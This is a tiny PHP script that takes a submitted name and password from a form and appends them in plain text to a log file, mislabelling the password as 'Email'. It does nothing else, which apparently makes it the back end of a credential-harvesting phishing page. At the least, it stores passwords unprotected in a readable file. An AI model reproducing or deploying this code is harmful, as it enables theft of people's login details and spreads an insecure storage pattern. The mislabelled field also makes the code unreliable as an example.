<?php 
    $name = $_POST['name'];
    $pass = $_POST['pass'];
    $log = fopen("log.txt", "a") or die("Unable to open file!");
    fwrite($log, "Name: " . $name . ", Email: " . $pass . "\n");
    fclose($log);
?>
